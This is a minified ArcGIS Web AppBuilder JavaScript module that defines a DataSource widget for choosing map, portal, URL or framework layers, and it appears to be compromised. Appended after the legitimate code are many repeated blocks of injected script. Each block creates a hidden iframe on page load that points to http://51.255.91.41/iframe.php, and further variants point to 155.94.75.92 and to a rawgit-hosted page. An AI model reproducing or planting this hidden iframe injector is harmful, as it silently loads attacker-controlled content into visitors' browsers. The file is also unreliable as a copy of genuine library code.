// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/on dojo/Evented dojo/_base/lang dojo/_base/html dojo/_base/array dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin jimu/dijit/TabContainer3 jimu/dijit/_FeaturelayerChooserWithButtons jimu/dijit/_QueryableLayerChooserWithButtons jimu/dijit/QueryableServiceChooserFromPortal jimu/dijit/_QueryableServiceChooserContent jimu/dijit/_FrameworkDataSourceChooserWithButtons".split(" "),function(l,m,f,n,k,p,q,r,t,u,v,w,x,y,z){var c=window.jimuNls.queryableLayerSource,
b=p([q,r,t,m],{templateString:"\x3cdiv\x3e\x3c/div\x3e",baseClass:"jimu-dijit-data-source",declaredClass:"jimu.dijit.DataSource",nls:null,dijits:null,types:null,postMixInProperties:function(){this.nls=c;this.dijits=[]},postCreate:function(){this.inherited(arguments);this._initSelf()},_initSelf:function(){var a=[];k.forEach(this.types,f.hitch(this,function(h,d){var c=h.type,g=b[c+"_CLASS_INFO"];if(g){var e=null;g.defaultOptions?(e=f.clone(g.defaultOptions),e=f.mixin(e,h.options)):e=h.options;e||(e=
{});e.style={width:"100%",height:"100%"};h=c+"_"+d;d=new g.className(e);n.addClass(d.domNode,"hidden");d._dsType=c;d._dataSourceId=h;d._classInfo=g;this.own(l(d,"ok",f.hitch(this,function(){var a=this.getSelectedItems();a&&0<a.length&&this.emit("ok",a)})));this.own(l(d,"cancel",f.hitch(this,function(){this.emit("cancel")})));this.dijits.push(d);a.push({title:g.defaultTitle,content:d})}else console.error("Unsupported data source type:",c)}));this.tab=new u({tabs:a});this.tab.placeAt(this.domNode)},
_getSelectedDijit:function(){var a=this.tab.getSelectedIndex();return this.dijits[a]},getSelectedSourceType:function(){var a=this._getSelectedDijit();return a?a._classInfo.sourceType:""},getSelectedItems:function(){var a=[],b=this._getSelectedDijit();b&&(a=b.getSelectedItems())&&0<a.length&&k.forEach(a,f.hitch(this,function(a){a.dataSourceType=b._dsType}));return a},destroy:function(){this.dijits&&0<this.dijits.length&&k.forEach(this.dijits,f.hitch(this,function(a){a.destroy();a=null}));this.dijits=
null;this.inherited(arguments)}});b.DATA_SOURCE_FEATURE_LAYER_FROM_MAP="DATA_SOURCE_FEATURE_LAYER_FROM_MAP";b.DATA_SOURCE_QUERYABLE_LAYER_FROM_MAP="DATA_SOURCE_QUERYABLE_LAYER_FROM_MAP";b.DATA_SOURCE_QUERYABLE_LAYER_FROM_PORTAL="DATA_SOURCE_QUERYABLE_LAYER_FROM_PORTAL";b.DATA_SOURCE_QUERYABLE_LAYER_FROM_URL="DATA_SOURCE_QUERYABLE_LAYER_FROM_URL";b.DATA_SOURCE_FROM_FRAMEWORK="DATA_SOURCE_FROM_FRAMEWORK";b.DATA_SOURCE_FEATURE_LAYER_FROM_MAP_CLASS_INFO={className:v,defaultTitle:c.selectFromMap,defaultOptions:{multiple:!1},
sourceType:"map"};b.DATA_SOURCE_QUERYABLE_LAYER_FROM_MAP_CLASS_INFO={className:w,defaultTitle:c.selectFromMap,defaultOptions:{multiple:!1},sourceType:"map"};b.DATA_SOURCE_QUERYABLE_LAYER_FROM_PORTAL_CLASS_INFO={className:x,defaultTitle:c.selectFromPortal,defaultOptions:{multiple:!1},sourceType:"portal"};b.DATA_SOURCE_QUERYABLE_LAYER_FROM_URL_CLASS_INFO={className:y,defaultTitle:c.addServiceUrl,defaultOptions:{multiple:!1},sourceType:"url"};b.DATA_SOURCE_FROM_FRAMEWORK_CLASS_INFO={className:z,defaultTitle:window.jimuNls.frameworkDatasource.customDataSource,
defaultOptions:null,sourceType:"framework"};b.createQueryableLayerTypes=function(a){return[{type:b.DATA_SOURCE_QUERYABLE_LAYER_FROM_MAP,options:{createMapResponse:a.createMapResponse,onlyShowWebMapLayers:!0}},{type:b.DATA_SOURCE_QUERYABLE_LAYER_FROM_PORTAL,options:{portalUrl:a.portalUrl}},{type:b.DATA_SOURCE_QUERYABLE_LAYER_FROM_URL}]};b.createInfographicTypes=function(a){return[{type:b.DATA_SOURCE_FEATURE_LAYER_FROM_MAP,options:{createMapResponse:a.createMapResponse,types:["point","polyline","polygon"],
showLayerFromFeatureSet:!0,showTable:!1,mustSupportStatistics:!1,ignoreVirtualLayer:!0,onlyShowWebMapLayers:!0}},{type:b.DATA_SOURCE_FROM_FRAMEWORK,options:{appConfig:a.appConfig}}]};return b});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});